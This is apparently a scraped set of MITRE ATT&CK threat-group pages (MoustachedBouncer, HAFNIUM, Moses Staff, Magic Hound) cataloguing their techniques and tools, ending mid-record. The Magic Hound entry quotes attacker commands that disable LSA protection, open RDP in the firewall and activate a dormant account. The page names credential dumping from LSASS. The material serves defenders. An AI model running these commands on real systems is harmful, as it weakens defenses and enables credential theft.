"content": " MoustachedBouncer MoustachedBouncer is a cyberespionage group that has been active since at least 2014 targeting foreign embassies in Belarus.[1] ID: G1019 Version: 1.0 Created: 25 September 2023 Last Modified: 16 April 2025 Version Permalink Live Version Techniques Used Domain ID Name Use Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell MoustachedBouncer has used plugins to execute PowerShell scripts.[1] .007 Command and Scripting Interpreter: JavaScript MoustachedBouncer has used JavaScript to deliver malware hosted on HTML pages.[1] Enterprise T1659 Content Injection MoustachedBouncer has injected content into DNS, HTTP, and SMB replies to redirect specifically-targeted victims to a fake Windows Update page to download malware.[1] Enterprise T1074 .002 Data Staged: Remote Data Staging MoustachedBouncer has used plugins to save captured screenshots to .\\AActdata\\ on an SMB share.[1] Enterprise T1068 Exploitation for Privilege Escalation MoustachedBouncer has exploited CVE-2021-1732 to execute malware components with elevated rights.[1] Enterprise T1027 .002 Obfuscated Files or Information: Software Packing MoustachedBouncer has used malware plugins packed with Themida.[1] Enterprise T1090 Proxy MoustachedBouncer has used a reverse proxy tool similar to the GitHub repository revsocks.[1] Enterprise T1113 Screen Capture MoustachedBouncer has used plugins to take screenshots on targeted systems.[1] Mobile T1655 .001 Masquerading: Match Legitimate Name or Location MoustachedBouncer has used legitimate looking filenames for malicious executables including MicrosoftUpdate845255.exe.[1] Software ID Name References Techniques S1088 Disco [1] Application Layer Protocol: File Transfer Protocols, Content Injection, Ingress Tool Transfer, Scheduled Task/Job: Scheduled Task, User Execution: Malicious File S1090 NightClub [1] Application Layer Protocol: DNS, Application Layer Protocol: Mail Protocols, Application Window Discovery, Audio Capture, Create or Modify System Process: Windows Service, Data Encoding: Non-Standard Encoding, Data from Local System, Data Staged: Local Data Staging, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: Timestomp, Ingress Tool Transfer, Input Capture: Keylogging, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Masquerade Task or Service, Modify Registry, Native API, Obfuscated Files or Information, Peripheral Device Discovery, Process Discovery, Screen Capture S1089 SharpDisco [1] Application Layer Protocol: File Transfer Protocols, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Exfiltration Over C2 Channel, File and Directory Discovery, Hide Artifacts: Hidden Window, Ingress Tool Transfer, Native API, Peripheral Device Discovery, Scheduled Task/Job: Scheduled Task, System Information Discovery References Faou, M. (2023, August 10). MoustachedBouncer: Espionage against foreign diplomats in Belarus. Retrieved September 25, 2023. "
},
{
"id": 178,
"title": "HAFNIUM, Operation Exchange Marauder, Silk Typhoon, Group G0125",
"path": "/groups/G0125/index.html",
"content": " HAFNIUM HAFNIUM is a likely state-sponsored cyber espionage group operating out of China that has been active since at least January 2021. HAFNIUM primarily targets entities in the US across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs. HAFNIUM has targeted remote management tools and cloud software for intial access and has demonstrated an ability to quickly operationalize exploits for identified vulnerabilities in edge devices.[1][2][3] ID: G0125 \u24d8 Associated Groups: Operation Exchange Marauder, Silk Typhoon Contributors: Daniyal Naeem, BT Security; Matt Brenton, Zurich Insurance Group; Mayuresh Dani, Qualys; Harshal Tupsamudre, Qualys; Vinayak Wadhwa, SAFE Security Version: 3.0 Created: 03 March 2021 Last Modified: 25 March 2025 Version Permalink Live Version Associated Group Descriptions Name Description Operation Exchange Marauder [2] Silk Typhoon [4][3] Techniques Used Domain ID Name Use Enterprise T1098 Account Manipulation HAFNIUM has granted privileges to domain accounts and reset the password for default admin accounts.[2][3] Enterprise T1583 .003 Acquire Infrastructure: Virtual Private Server HAFNIUM has operated from leased virtual private servers (VPS) in the United States.[1] .005 Acquire Infrastructure: Botnet HAFNIUM has incorporated leased devices into covert networks to obfuscate communications.[3] .006 Acquire Infrastructure: Web Services HAFNIUM has acquired web services for use in C2 and exfiltration.[1] Enterprise T1071 .001 Application Layer Protocol: Web Protocols HAFNIUM has used open-source C2 frameworks, including Covenant.[1] Enterprise T1560 .001 Archive Collected Data: Archive via Utility HAFNIUM has used 7-Zip and WinRAR to compress stolen files for exfiltration.[1][2] Enterprise T1119 Automated Collection HAFNIUM has used MSGraph to exfiltrate data from email, OneDrive, and SharePoint.[3] Enterprise T1110 .003 Brute Force: Password Spraying HAFNIUM has gained initial access through password spray attacks.[3] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell HAFNIUM has used the Exchange Power Shell module Set-OabVirtualDirectoryPowerShell to export mailbox data.[1][2] .003 Command and Scripting Interpreter: Windows Command Shell HAFNIUM has used cmd.exe to execute commands on the victim's machine.[5] Enterprise T1584 .005 Compromise Infrastructure: Botnet HAFNIUM has used compromised devices in covert networks to obfuscate communications.[3] Enterprise T1136 .002 Create Account: Domain Account HAFNIUM has created domain accounts.[2][3] Enterprise T1555 .006 Credentials from Password Stores: Cloud Secrets Management Stores HAFNIUM has moved laterally from on-premises environments to steal passwords from Azure key vaults.[3] Enterprise T1132 .001 Data Encoding: Standard Encoding HAFNIUM has used ASCII encoding for C2 traffic.[1] Enterprise T1530 Data from Cloud Storage HAFNIUM has exfitrated data from OneDrive.[3] Enterprise T1213 .002 Data from Information Repositories: Sharepoint HAFNIUM has abused compromised credentials to exfiltrate data from SharePoint.[3] Enterprise T1005 Data from Local System HAFNIUM has collected data and files from a compromised machine.[5][3] Enterprise T1114 .002 Email Collection: Remote Email Collection HAFNIUM has used web shells and MSGraph to export mailbox data.[1][2][3] Enterprise T1567 .002 Exfiltration Over Web Service: Exfiltration to Cloud Storage HAFNIUM has exfiltrated data to file sharing sites, including MEGA.[1] Enterprise T1190 Exploit Public-Facing Application HAFNIUM has exploited multiple vulnerabilities to compromise edge devices and on-premises versions of Microsoft Exchange Server.[1][2][6][7][8][3] Enterprise T1068 Exploitation for Privilege Escalation HAFNIUM has targeted unpatched applications to elevate access in targeted organizations.[3] Enterprise T1083 File and Directory Discovery HAFNIUM has searched file contents on a compromised host.[5] Enterprise T1592 .004 Gather Victim Host Information: Client Configurations HAFNIUM has interacted with Office 365 tenants to gather details regarding target's environments.[1] Enterprise T1589 .002 Gather Victim Identity Information: Email Addresses HAFNIUM has collected e-mail addresses for users they intended to target.[2] Enterprise T1590 Gather Victim Network Information HAFNIUM gathered the fully qualified domain names (FQDNs) for targeted Exchange servers in the victim's environment.[2] .005 IP Addresses HAFNIUM has obtained IP addresses for publicly-accessible Exchange servers.[2] Enterprise T1564 .001 Hide Artifacts: Hidden Files and Directories HAFNIUM has hidden files on a compromised host.[5] Enterprise T1070 .001 Indicator Removal: Clear Windows Event Logs HAFNIUM has cleared actor-performed actions from logs.[3] Enterprise T1105 Ingress Tool Transfer HAFNIUM has downloaded malware and tools--including Nishang and PowerCat--onto a compromised host.[1][5] Enterprise T1095 Non-Application Layer Protocol HAFNIUM has used TCP for C2.[1] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory HAFNIUM has used procdump to dump the LSASS process memory.[1][2][5] .003 OS Credential Dumping: NTDS HAFNIUM has stolen copies of the Active Directory database (NTDS.DIT).[2][3] Enterprise T1057 Process Discovery HAFNIUM has used tasklist to enumerate processes.[5] Enterprise T1018 Remote System Discovery HAFNIUM has enumerated domain controllers using net group \"Domain computers\" and nltest /dclist.[5] Enterprise T1593 .003 Search Open Websites/Domains: Code Repositories HAFNIUM has discovered leaked corporate credentials on public repositories including GitHub.[3] Enterprise T1505 .003 Server Software Component: Web Shell HAFNIUM has deployed multiple web shells on compromised servers including SIMPLESEESHARP, SPORTSBALL, China Chopper, and ASPXSpy.[1][2][6][7][5][3] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 HAFNIUM has used rundll32 to load malicious DLLs.[2] Enterprise T1016 System Network Configuration Discovery HAFNIUM has collected IP information via IPInfo.[5] .001 Internet Connection Discovery HAFNIUM has checked for network connectivity from a compromised host using ping, including attempts to contact google[.]com.[5] Enterprise T1033 System Owner/User Discovery HAFNIUM has used whoami to gather user information.[5] Enterprise T1199 Trusted Relationship HAFNIUM has used stolen API keys and credentials associatd with privilege access management (PAM), cloud app providers, and cloud data management companies to access downstream customer environments.[3] Enterprise T1550 .001 Use Alternate Authentication Material: Application Access Token HAFNIUM has abused service principals with administrative permissions for data exfiltration.[3] Enterprise T1078 .003 Valid Accounts: Local Accounts HAFNIUM has used the NT AUTHORITY\\SYSTEM account to create files on Exchange servers.[6] .004 Valid Accounts: Cloud Accounts HAFNIUM has abused service principals in compromised environments to enable data exfiltration.[3] Software ID Name References Techniques S0073 ASPXSpy [2] Server Software Component: Web Shell S0020 China Chopper [2][6][5] Application Layer Protocol: Web Protocols, Brute Force: Password Guessing, Command and Scripting Interpreter: Windows Command Shell, Data from Local System, File and Directory Discovery, Indicator Removal: Timestomp, Ingress Tool Transfer, Network Service Discovery, Obfuscated Files or Information: Software Packing, Server Software Component: Web Shell S1155 Covenant HAFNIUM used Covenant for command and control following compromise of internet-facing servers.[1][3] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Encrypted Channel: Asymmetric Cryptography, Non-Standard Port, System Binary Proxy Execution: Regsvr32, System Binary Proxy Execution: InstallUtil, System Binary Proxy Execution: Mshta, System Information Discovery, Windows Management Instrumentation S0357 Impacket [7] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0029 PsExec [2] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S1011 Tarrask [7] Access Token Manipulation: Token Impersonation/Theft, Command and Scripting Interpreter: Windows Command Shell, Hide Artifacts, Masquerading: Match Legitimate Resource Name or Location, Masquerading: Masquerade Task or Service, Modify Registry, Scheduled Task/Job: Scheduled Task References MSTIC. (2021, March 2). HAFNIUM targeting Exchange Servers with 0-day exploits. Retrieved March 3, 2021. Gruzweig, J. et al. (2021, March 2). Operation Exchange Marauder: Active Exploitation of Multiple Zero-Day Microsoft Exchange Vulnerabilities. Retrieved March 3, 2021. Microsoft Threat Intelligence . (2025, March 5). Silk Typhoon targeting IT supply chain. Retrieved March 20, 2025. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. Eoin Miller. (2021, March 23). Defending Against the Zero Day: Analyzing Attacker Behavior Post-Exploitation of Microsoft Exchange. Retrieved October 27, 2022. Bromiley, M. et al. (2021, March 4). Detection and Response to Exploitation of Microsoft Exchange Zero-Day Vulnerabilities. Retrieved March 9, 2021. Microsoft Threat Intelligence Team & Detection and Response Team . (2022, April 12). Tarrask malware uses scheduled tasks for defense evasion. Retrieved June 1, 2022. Microsoft Threat Intelligence. (2021, December 11). Guidance for preventing, detecting, and hunting for exploitation of the Log4j 2 vulnerability. Retrieved December 7, 2023. "
},
{
"id": 179,
"title": "Moses Staff, DEV-0500, Marigold Sandstorm, Group G1009",
"path": "/groups/G1009/index.html",
"content": " Moses Staff Moses Staff is a suspected Iranian threat group that has primarily targeted Israeli companies since at least September 2021. Moses Staff openly stated their motivation in attacking Israeli companies is to cause damage by leaking stolen sensitive data and encrypting the victim's networks without a ransom demand.[1] Security researchers assess Moses Staff is politically motivated, and has targeted government, finance, travel, energy, manufacturing, and utility companies outside of Israel as well, including those in Italy, India, Germany, Chile, Turkey, the UAE, and the US.[2] ID: G1009 \u24d8 Associated Groups: DEV-0500, Marigold Sandstorm Contributors: Hiroki Nagahama, NEC Corporation; Pooja Natarajan, NEC Corporation India; Manikantan Srinivasan, NEC Corporation India Version: 2.0 Created: 11 August 2022 Last Modified: 11 April 2024 Version Permalink Live Version Associated Group Descriptions Name Description DEV-0500 [3] Marigold Sandstorm [3] Techniques Used Domain ID Name Use Enterprise T1087 .001 Account Discovery: Local Account Moses Staff has collected the administrator username from a compromised host.[1] Enterprise T1587 .001 Develop Capabilities: Malware Moses Staff has built malware, such as DCSrv and PyDCrypt, for targeting victims' machines.[1] Enterprise T1190 Exploit Public-Facing Application Moses Staff has exploited known vulnerabilities in public-facing infrastructure such as Microsoft Exchange Servers.[1] Enterprise T1562 .004 Impair Defenses: Disable or Modify System Firewall Moses Staff has used batch scripts that can disable the Windows firewall on specific remote machines.[1] Enterprise T1105 Ingress Tool Transfer Moses Staff has downloaded and installed web shells to following path C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\IISpool.aspx.[1] Enterprise T1027 .013 Obfuscated Files or Information: Encrypted/Encoded File Moses Staff has used obfuscated web shells in their operations.[1] Enterprise T1588 .002 Obtain Capabilities: Tool Moses Staff has used the commercial tool DiskCryptor.[1] Enterprise T1021 .002 Remote Services: SMB/Windows Admin Shares Moses Staff has used batch scripts that can enable SMB on a compromised host.[1] Enterprise T1505 .003 Server Software Component: Web Shell Moses Staff has dropped a web shell onto a compromised system.[1] Enterprise T1553 .002 Subvert Trust Controls: Code Signing Moses Staff has used signed drivers from an open source tool called DiskCryptor to evade detection.[1] Enterprise T1082 System Information Discovery Moses Staff collected information about the infected host, including the machine names and OS architecture.[1] Enterprise T1016 System Network Configuration Discovery Moses Staff has collected the domain name of a compromised network.[1] Software ID Name References Techniques S1033 DCSrv [1] Create or Modify System Process: Windows Service, Data Encrypted for Impact, Masquerading: Masquerade Task or Service, Modify Registry, Native API, Obfuscated Files or Information: Encrypted/Encoded File, System Shutdown/Reboot, System Time Discovery S0029 PsExec [1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S1032 PyDCrypt [1] Command and Scripting Interpreter: Python, Command and Scripting Interpreter: Windows Command Shell, Command and Scripting Interpreter: PowerShell, Deobfuscate/Decode Files or Information, Impair Defenses: Disable or Modify System Firewall, Indicator Removal: File Deletion, Masquerading: Match Legitimate Resource Name or Location, Obfuscated Files or Information: Encrypted/Encoded File, System Network Connections Discovery, System Owner/User Discovery, Windows Management Instrumentation S1034 StrifeWater [2] Command and Scripting Interpreter: Windows Command Shell, Data from Local System, Encrypted Channel: Symmetric Cryptography, Exfiltration Over C2 Channel, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Masquerading: Match Legitimate Resource Name or Location, Native API, Scheduled Task/Job, Screen Capture, System Information Discovery, System Owner/User Discovery, System Time Discovery, Virtualization/Sandbox Evasion: Time Based Evasion References Checkpoint Research. (2021, November 15). Uncovering MosesStaff techniques: Ideology over Money. Retrieved August 11, 2022. Cybereason Nocturnus. (2022, February 1). StrifeWater RAT: Iranian APT Moses Staff Adds New Trojan to Ransomware Operations. Retrieved August 15, 2022. Microsoft . (2023, July 12). How Microsoft names threat actors. Retrieved November 17, 2023. "
},
{
"id": 180,
"title": "Magic Hound, TA453, COBALT ILLUSION, Charming Kitten, ITG18, Phosphorus, Newscaster, APT35, Mint Sandstorm, Group G0059",
"path": "/groups/G0059/index.html",
"content": " Magic Hound Magic Hound is an Iranian-sponsored threat group that conducts long term, resource-intensive cyber espionage operations, likely on behalf of the Islamic Revolutionary Guard Corps. They have targeted European, U.S., and Middle Eastern government and military personnel, academics, journalists, and organizations such as the World Health Organization (WHO), via complex social engineering campaigns since at least 2014.[1][2][3][4][5] ID: G0059 \u24d8 Associated Groups: TA453, COBALT ILLUSION, Charming Kitten, ITG18, Phosphorus, Newscaster, APT35, Mint Sandstorm Contributors: Anastasios Pingios; Bryan Lee; Daniyal Naeem, BT Security Version: 6.1 Created: 16 January 2018 Last Modified: 17 November 2024 Version Permalink Live Version Associated Group Descriptions Name Description TA453 [6][5][7] COBALT ILLUSION [4] Charming Kitten [8][9][10][2][6][7] ITG18 [11] Phosphorus [12][13][14][3][6][7] Newscaster Link analysis of infrastructure and tools revealed a potential relationship between Magic Hound and the older attack campaign called Newscaster (aka Newscasters).[15][1] APT35 [1][3][7] Mint Sandstorm [16] Techniques Used Domain ID Name Use Enterprise T1087 .003 Account Discovery: Email Account Magic Hound has used Powershell to discover email accounts.[17] Enterprise T1098 .002 Account Manipulation: Additional Email Delegate Permissions Magic Hound granted compromised email accounts read access to the email boxes of additional targeted accounts. The group then was able to authenticate to the intended victim's OWA (Outlook Web Access) portal and read hundreds of email communications for information on Middle East organizations.[1] .007 Account Manipulation: Additional Local or Domain Groups Magic Hound has added a user named DefaultAccount to the Administrators and Remote Desktop Users groups.[17] Enterprise T1583 .001 Acquire Infrastructure: Domains Magic Hound has registered fraudulent domains such as \"mail-newyorker.com\" and \"news12.com.recover-session-service.site\" to target specific victims with phishing attacks.[3] .006 Acquire Infrastructure: Web Services Magic Hound has acquired Amazon S3 buckets to use in C2.[7] Enterprise T1595 .002 Active Scanning: Vulnerability Scanning Magic Hound has conducted widespread scanning to identify public-facing systems vulnerable to CVE-2021-44228 in Log4j and ProxyShell vulnerabilities; CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065 in on-premises MS Exchange Servers; and CVE-2018-13379 in Fortinet FortiOS SSL VPNs.[7][18] Enterprise T1071 Application Layer Protocol Magic Hound malware has used IRC for C2.[15][19] .001 Web Protocols Magic Hound has used HTTP for C2.[15][17][19] Enterprise T1560 .001 Archive Collected Data: Archive via Utility Magic Hound has used gzip to archive dumped LSASS process memory and RAR to stage and compress local folders.[1][17][19] Enterprise T1547 .001 Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder Magic Hound malware has used Registry Run keys to establish persistence.[15][19][18] Enterprise T1059 .001 Command and Scripting Interpreter: PowerShell Magic Hound has used PowerShell for execution and privilege escalation.[15][1][17][19][18] .003 Command and Scripting Interpreter: Windows Command Shell Magic Hound has used the command-line interface for code execution.[15][17][19] .005 Command and Scripting Interpreter: Visual Basic Magic Hound malware has used VBS scripts for execution.[15] Enterprise T1586 .002 Compromise Accounts: Email Accounts Magic Hound has compromised personal email accounts through the use of legitimate credentials and gathered additional victim information.[11] Enterprise T1584 .001 Compromise Infrastructure: Domains Magic Hound has used compromised domains to host links targeted to specific phishing victims.[2][5][3][20] Enterprise T1136 .001 Create Account: Local Account Magic Hound has created local accounts named help and DefaultAccount on compromised machines.[17][18] Enterprise T1486 Data Encrypted for Impact Magic Hound has used BitLocker and DiskCryptor to encrypt targeted workstations. [19][18] Enterprise T1005 Data from Local System Magic Hound has used a web shell to exfiltrate a ZIP file containing a dump of LSASS memory on a compromised machine.[17][19] Enterprise T1482 Domain Trust Discovery Magic Hound has used a web shell to execute nltest /trusted_domains to identify trust relationships.[19] Enterprise T1189 Drive-by Compromise Magic Hound has conducted watering-hole attacks through media and magazine websites.[2] Enterprise T1114 Email Collection Magic Hound has compromised email credentials in order to steal sensitive data.[3] .001 Local Email Collection Magic Hound has collected .PST archives.[1] .002 Remote Email Collection Magic Hound has exported emails from compromised Exchange servers including through use of the cmdlet New-MailboxExportRequest.[17][19] Enterprise T1573 Encrypted Channel Magic Hound has used an encrypted http proxy in C2 communications.[19] Enterprise T1585 .001 Establish Accounts: Social Media Accounts Magic Hound has created fake LinkedIn and other social media accounts to contact targets and convince them--through messages and voice communications--to open malicious links.[2] .002 Establish Accounts: Email Accounts Magic Hound has established email accounts using fake personas for spearphishing operations.[11][6] Enterprise T1567 Exfiltration Over Web Service Magic Hound has used the Telegram API sendMessage to relay data on compromised devices.[20] Enterprise T1190 Exploit Public-Facing Application Magic Hound has exploited the Log4j utility (CVE-2021-44228), on-premises MS Exchange servers via \"ProxyShell\" (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207), and Fortios SSL VPNs (CVE-2018-13379).[7][17][21][19][18][22] Enterprise T1083 File and Directory Discovery Magic Hound malware can list a victim's logical drives and the type, as well the total/free space of the fixed devices. Other malware can list a directory's contents.[15] Enterprise T1592 .002 Gather Victim Host Information: Software Magic Hound has captured the user-agent strings from visitors to their phishing sites.[20] Enterprise T1589 Gather Victim Identity Information Magic Hound has acquired mobile phone numbers of potential targets, possibly for mobile malware or additional phishing operations.[5] .001 Credentials Magic Hound gathered credentials from two victims that they then attempted to validate across 75 different websites. Magic Hound has also collected credentials from over 900 Fortinet VPN servers in the US, Europe, and Israel.[11][18] .002 Email Addresses Magic Hound has identified high-value email accounts in academia, journalism, NGO's, foreign policy, and national security for targeting.[5][20] Enterprise T1590 .005 Gather Victim Network Information: IP Addresses Magic Hound has captured the IP addresses of visitors to their phishing sites.[20] Enterprise T1591 .001 Gather Victim Org Information: Determine Physical Locations Magic Hound has collected location information from visitors to their phishing sites.[20] Enterprise T1564 .003 Hide Artifacts: Hidden Window Magic Hound malware has a function to determine whether the C2 server wishes to execute the newly dropped file in a hidden window.[15] Enterprise T1562 Impair Defenses Magic Hound has disabled LSA protection on compromised hosts using \"reg\" add HKLM\\SYSTEM\\CurrentControlSet\\Control\\LSA /v RunAsPPL /t REG_DWORD /d 0 /f.[17] .001 Disable or Modify Tools Magic Hound has disabled antivirus services on targeted systems in order to upload malicious payloads.[17] .002 Disable Windows Event Logging Magic Hound has executed scripts to disable the event log service.[19] .004 Disable or Modify System Firewall Magic Hound has added the following rule to a victim's Windows firewall to allow RDP traffic - \"netsh\" advfirewall firewall add rule name=\"Terminal Server\" dir=in action=allow protocol=TCP localport=3389.[17][19] Enterprise T1070 .003 Indicator Removal: Clear Command History Magic Hound has removed mailbox export requests from compromised Exchange servers.[17] .004 Indicator Removal: File Deletion Magic Hound has deleted and overwrote files to cover tracks.[15][1][19] Enterprise T1105 Ingress Tool Transfer Magic Hound has downloaded additional code and files from servers onto victims.[15][17][19][18] Enterprise T1056 .001 Input Capture: Keylogging Magic Hound malware is capable of keylogging.[15] Enterprise T1570 Lateral Tool Transfer Magic Hound has copied tools within a compromised network using RDP.[19] Enterprise T1036 .004 Masquerading: Masquerade Task or Service Magic Hound has named a malicious script CacheTask.bat to mimic a legitimate task.[19] .005 Masquerading: Match Legitimate Resource Name or Location Magic Hound has used dllhost.exe to mask Fast Reverse Proxy (FRP) and MicrosoftOutLookUpdater.exe for Plink.[17][19][18] .010 Masquerading: Masquerade Account Name Magic Hound has created local accounts named help and DefaultAccount on compromised machines.[17][18] Enterprise T1112 Modify Registry Magic Hound has modified Registry settings for security tools.[17] Enterprise T1046 Network Service Discovery Magic Hound has used KPortScan 3.0 to perform SMB, RDP, and LDAP scanning.[19] Enterprise T1571 Non-Standard Port Magic Hound malware has communicated with its C2 server over TCP ports 4443 and 10151 using HTTP.[15][19] Enterprise T1027 .010 Obfuscated Files or Information: Command Obfuscation Magic Hound has used base64-encoded commands.[15][18] .013 Obfuscated Files or Information: Encrypted/Encoded File Magic Hound malware has used base64-encoded files and has also encrypted embedded strings with AES.[15][18] Enterprise T1588 .002 Obtain Capabilities: Tool Magic Hound has obtained and used tools like Havij, sqlmap, Metasploit, Mimikatz, and Plink.[23][1][7][19][18] Enterprise T1003 .001 OS Credential Dumping: LSASS Memory Magic Hound has stolen domain credentials by dumping LSASS process memory using Task Manager, comsvcs.dll, and from a Microsoft Active Directory Domain Controller using Mimikatz.[1][17][19][18] Enterprise T1566 .002 Phishing: Spearphishing Link Magic Hound has sent malicious URL links through email to victims. In some cases the URLs were shortened or linked to Word documents with malicious macros that executed PowerShells scripts to download Pupy.[24][2][3][18] .003 Phishing: Spearphishing via Service Magic Hound used various social media channels (such as LinkedIn) as well as messaging services (such as WhatsApp) to spearphish victims.[25][12][2] Enterprise T1598 .003 Phishing for Information: Spearphishing Link Magic Hound has used SMS and email messages with links designed to steal credentials or track victims.[3][2][6][5][20][18] Enterprise T1057 Process Discovery Magic Hound malware can list running processes.[15] Enterprise T1572 Protocol Tunneling Magic Hound has used Plink to tunnel RDP over SSH.[19] Enterprise T1090 Proxy Magic Hound has used Fast Reverse Proxy (FRP) for RDP traffic.[19] Enterprise T1021 .001 Remote Services: Remote Desktop Protocol Magic Hound has used Remote Desktop Services to copy tools on targeted systems.[17][19] Enterprise T1018 Remote System Discovery Magic Hound has used Ping for discovery on targeted networks.[19] Enterprise T1053 .005 Scheduled Task/Job: Scheduled Task Magic Hound has used scheduled tasks to establish persistence and execution.[17][19] Enterprise T1113 Screen Capture Magic Hound malware can take a screenshot and upload the file to its C2 server.[15] Enterprise T1505 .003 Server Software Component: Web Shell Magic Hound has used multiple web shells to gain execution.[17][19] Enterprise T1218 .011 System Binary Proxy Execution: Rundll32 Magic Hound has used rundll32.exe to execute MiniDump from comsvcs.dll when dumping LSASS memory.[17] Enterprise T1082 System Information Discovery Magic Hound malware has used a PowerShell command to check the victim system architecture to determine if it is an x64 machine. Other malware has obtained the OS version, UUID, and computer/host name to send to the C2 server.[15][17][19] Enterprise T1016 System Network Configuration Discovery Magic Hound malware gathers the victim's local IP address, MAC address, and external IP address.[15][17][19] .001 Internet Connection Discovery Magic Hound has conducted a network call out to a specific website as part of their initial discovery activity.[19] .002 Wi-Fi Discovery Magic Hound has collected names and passwords of all Wi-Fi networks to which a device has previously connected.[7] Enterprise T1049 System Network Connections Discovery Magic Hound has used quser.exe to identify existing RDP connections.[17] Enterprise T1033 System Owner/User Discovery Magic Hound malware has obtained the victim username and sent it to the C2 server.[15][17][19] Enterprise T1204 .001 User Execution: Malicious Link Magic Hound has attempted to lure victims into opening malicious links embedded in emails.[2][3] .002 User Execution: Malicious File Magic Hound has attempted to lure victims into opening malicious email attachments.[2] Enterprise T1078 .001 Valid Accounts: Default Accounts Magic Hound enabled and used the default system managed account, DefaultAccount, via \"powershell.exe\" /c net user DefaultAccount /active:yes to connect to a targeted Exchange server over RDP.[19] .002 Valid Accounts: Domain Accounts Magic Hound has used domain administrator accounts after dumping LSASS process memory.[19] Enterprise T1102 .002 Web Service: Bidirectional Communication Magic Hound malware can use a SOAP Web service to communicate with its C2 server.[15] Enterprise T1047 Windows Management Instrumentation Magic Hound has used a tool to run cmd /c wmic computersystem get domain for discovery.[17] Software ID Name References Techniques S0674 CharmPower [7] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Data Encoding: Standard Encoding, Data from Local System, Deobfuscate/Decode Files or Information, Encrypted Channel: Symmetric Cryptography, Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted Non-C2 Protocol, Exfiltration Over C2 Channel, Fallback Channels, File and Directory Discovery, Indicator Removal: File Deletion, Ingress Tool Transfer, Modify Registry, Process Discovery, Query Registry, Screen Capture, Software Discovery, System Information Discovery, System Network Configuration Discovery, System Network Connections Discovery, Web Service: Dead Drop Resolver, Web Service, Windows Management Instrumentation S0186 DownPaper [8] Application Layer Protocol: Web Protocols, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: Windows Command Shell, Query Registry, System Information Discovery, System Owner/User Discovery S1144 FRP [19] Application Layer Protocol: Web Protocols, Command and Scripting Interpreter: JavaScript, Encrypted Channel: Asymmetric Cryptography, Encrypted Channel: Symmetric Cryptography, Network Service Discovery, Non-Application Layer Protocol, Protocol Tunneling, Proxy, Proxy: Multi-hop Proxy, System Network Connections Discovery S0357 Impacket [19] Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Lateral Tool Transfer, Network Sniffing, OS Credential Dumping: NTDS, OS Credential Dumping: LSASS Memory, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSA Secrets, Steal or Forge Kerberos Tickets: Kerberoasting, Steal or Forge Kerberos Tickets: Ccache Files, System Services: Service Execution, Windows Management Instrumentation S0100 ipconfig [17][19] System Network Configuration Discovery S0002 Mimikatz [1] Access Token Manipulation: SID-History Injection, Account Manipulation, Boot or Logon Autostart Execution: Security Support Provider, Credentials from Password Stores, Credentials from Password Stores: Credentials from Web Browsers, Credentials from Password Stores: Windows Credential Manager, OS Credential Dumping: DCSync, OS Credential Dumping: Security Account Manager, OS Credential Dumping: LSASS Memory, OS Credential Dumping: LSA Secrets, Rogue Domain Controller, Steal or Forge Authentication Certificates, Steal or Forge Kerberos Tickets: Golden Ticket, Steal or Forge Kerberos Tickets: Silver Ticket, Unsecured Credentials: Private Keys, Use Alternate Authentication Material: Pass the Hash, Use Alternate Authentication Material: Pass the Ticket S0039 Net [17][19] Account Discovery: Domain Account, Account Discovery: Local Account, Account Manipulation: Additional Local or Domain Groups, Create Account: Local Account, Create Account: Domain Account, Indicator Removal: Network Share Connection Removal, Network Share Discovery, Password Policy Discovery, Permission Groups Discovery: Domain Groups, Permission Groups Discovery: Local Groups, Remote Services: SMB/Windows Admin Shares, Remote System Discovery, System Network Connections Discovery, System Service Discovery, System Services: Service Execution, System Time Discovery S0108 netsh [17] Event Triggered Execution: Netsh Helper DLL, Impair Defenses: Disable or Modify System Firewall, Proxy, Software Discovery: Security Software Discovery S0097 Ping [19] Remote System Discovery S1012 PowerLess [21] Archive Collected Data, Browser Information Discovery, Command and Scripting Interpreter: PowerShell, Data from Local System, Data Staged: Local Data Staging, Deobfuscate/Decode Files or Information, Encrypted Channel, Ingress Tool Transfer, Input Capture: Keylogging S0029 PsExec [1] Create Account: Domain Account, Create or Modify System Process: Windows Service, Lateral Tool Transfer, Remote Services: SMB/Windows Admin Shares, System Services: Service Execution S0192 Pupy [15][1][24] Abuse Elevation Control Mechanism: Bypass User Account Control, Access Token Manipulation: Token Impersonation/Theft, Account Discovery: Local Account, Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay, Application Layer Protocol: Web Protocols, Archive Collected Data: Archive via Utility, Audio Capture, Boot or Logon Autostart Execution: XDG Autostart Entries, Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder, Command and Scripting Interpreter: PowerShell, Command and Scripting Interpreter: 